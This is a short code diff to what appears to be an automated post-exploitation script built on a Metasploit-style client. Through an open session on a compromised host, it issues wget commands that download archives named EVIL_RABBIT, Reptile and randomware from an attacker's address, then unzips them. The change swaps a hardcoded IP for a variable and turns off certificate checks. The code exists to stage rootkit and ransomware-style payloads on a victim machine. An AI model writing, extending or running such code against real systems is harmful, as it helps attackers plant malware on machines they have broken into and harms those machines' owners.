@@ -26,9 +26,9 @@ def main(argv):
     time.sleep(2)
 
     shell = client.sessions.session('1')
-    shell.write('wget http://192.168.1.102/downloads/EVIL_RABBIT.zip')
-    shell.write('wget http://192.168.1.102/downloads/Reptile.zip')
-    shell.write('wget http://192.168.1.102/downloads/randomware.zip')
+    shell.write('wget --no-check-certificate http://{0}/downloads/EVIL_RABBIT.zip'.format(my_ip))
+    shell.write('wget --no-check-certificate http://{0}/downloads/Reptile.zip'.format(my_ip))
+    shell.write('wget --no-check-certificate http://{0}/downloads/randomware.zip'.format(my_ip))
     shell.write('unzip EVIL_RABBIT.zip')
     shell.write('unzip Reptile.zip')
     shell.write('unzip randomware.zip')
